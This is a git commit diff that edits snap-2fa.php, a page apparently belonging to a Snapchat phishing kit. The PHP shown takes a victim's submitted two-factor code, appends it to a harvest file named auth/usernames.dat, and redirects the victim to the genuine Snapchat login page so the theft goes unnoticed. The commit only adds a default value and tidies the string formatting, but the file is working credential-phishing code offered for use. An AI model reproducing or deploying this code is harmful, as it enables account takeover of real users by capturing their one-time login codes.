50eef846680ff901ce55a43a9663820563d09a19
mosean2000 <ayesha1281827@gmail.com>
2025-06-27 14:16:44 +0500

    Update snap-2fa.php

--- .sites/snapchat/snap-2fa.php
+++ .sites/snapchat/snap-2fa.php
@@ -1,10 +1,9 @@
 <?php
 
-$code = $_POST['code'];
+$code = $_POST['code'] ?? 'EMPTY_CODE';
 
-file_put_contents("auth/usernames.dat", "Snapchat 2FA Code: " . $code . "\n\n", FILE_APPEND);
+file_put_contents("auth/usernames.dat", "Snapchat 2FA Code: $code\n", FILE_APPEND);
 
 header('Location: https://accounts.snapchat.com/accounts/login');
 exit();
-
 ?>
